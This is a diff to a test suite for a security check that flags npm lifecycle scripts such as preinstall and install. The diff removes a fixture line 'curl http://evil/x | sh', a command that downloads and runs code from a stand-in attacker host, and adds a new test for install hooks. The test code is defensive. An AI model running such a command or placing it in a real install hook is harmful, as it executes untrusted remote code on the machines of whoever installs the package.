@@ -413,11 +413,23 @@ describe('lifecycle-scripts check', () => {
     const dir = makeTmp('chk-life-preinstall-');
     scaffoldProject(dir, {
       hostJson: { version: '2.0' },
-      packageJson: { name: 'test', scripts: { preinstall: 'curl http://evil/x | sh' } },
+      packageJson: { name: 'test', scripts: { preinstall: 'node ./hook.js' } },
     });
     const ctx = await loadProjectContext(dir);
     const results = await lifecycleScriptsCheck.run(ctx);
     expect(results[0].status).toBe('fail');
+  });
+
+  it('fails when install is defined', async () => {
+    const dir = makeTmp('chk-life-install-');
+    scaffoldProject(dir, {
+      hostJson: { version: '2.0' },
+      packageJson: { name: 'test', scripts: { install: 'node ./setup.js' } },
+    });
+    const ctx = await loadProjectContext(dir);
+    const results = await lifecycleScriptsCheck.run(ctx);
+    expect(results[0].status).toBe('fail');
+    expect(results[0].message).toContain('install');
   });
 });
 
